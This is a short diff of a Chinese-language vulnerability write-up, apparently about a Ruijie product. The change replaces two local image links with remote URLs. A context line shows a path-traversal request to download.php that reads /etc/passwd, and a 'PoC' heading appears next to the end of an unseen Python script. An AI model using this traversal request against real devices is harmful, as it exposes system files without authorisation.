@@ -224,7 +224,7 @@ include_once AROOT.'init.php';    //mvc初始化入口，放在底部
 /download.php?a=read_txt&file=../../../../etc/passwd
 ```
 
-![](image/ruijie-33.png)
+![](http://wikioss.peiqi.tech/vuln/ruijie-33.png)
 
 ## 漏洞POC
 
@@ -313,4 +313,4 @@ if __name__ == '__main__':
 
 ```
 
-![](image/ruijie-34.png)
+![](http://wikioss.peiqi.tech/vuln/ruijie-34.png)
